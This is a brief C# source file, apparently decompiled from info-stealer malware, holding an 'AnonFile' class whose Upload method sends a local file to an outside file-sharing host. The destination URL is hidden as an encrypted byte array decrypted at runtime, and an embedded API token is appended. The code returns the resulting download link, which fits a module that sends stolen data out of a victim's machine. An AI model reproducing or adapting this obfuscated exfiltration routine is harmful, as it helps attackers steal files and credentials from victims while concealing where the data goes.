using System;
using System.Net;
using System.Text;

namespace Client.Modules.Manager;

internal sealed class AnonFile
{
	public static string Upload(string file, bool api = false)
	{
		try
		{
			using WebClient webClient = new WebClient();
			byte[] bytes = webClient.UploadFile(StringsCrypt.Decrypt(new byte[48]
			{
				4, 203, 201, 210, 147, 242, 36, 225, 66, 42,
				36, 218, 27, 178, 235, 223, 170, 114, 211, 210,
				237, 234, 99, 134, 41, 195, 235, 18, 139, 139,
				53, 239, 207, 253, 34, 1, 192, 176, 118, 47,
				164, 23, 131, 62, 62, 37, 108, 32
			}) + (api ? StringsCrypt.AnonApiToken : ""), file);
			string @string = Encoding.ASCII.GetString(bytes);
			if (!@string.Contains("\"error\": {"))
			{
				return @string.Split(new char[1] { '"' })[15];
			}
			Console.WriteLine(@string);
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
		return null;
	}
}
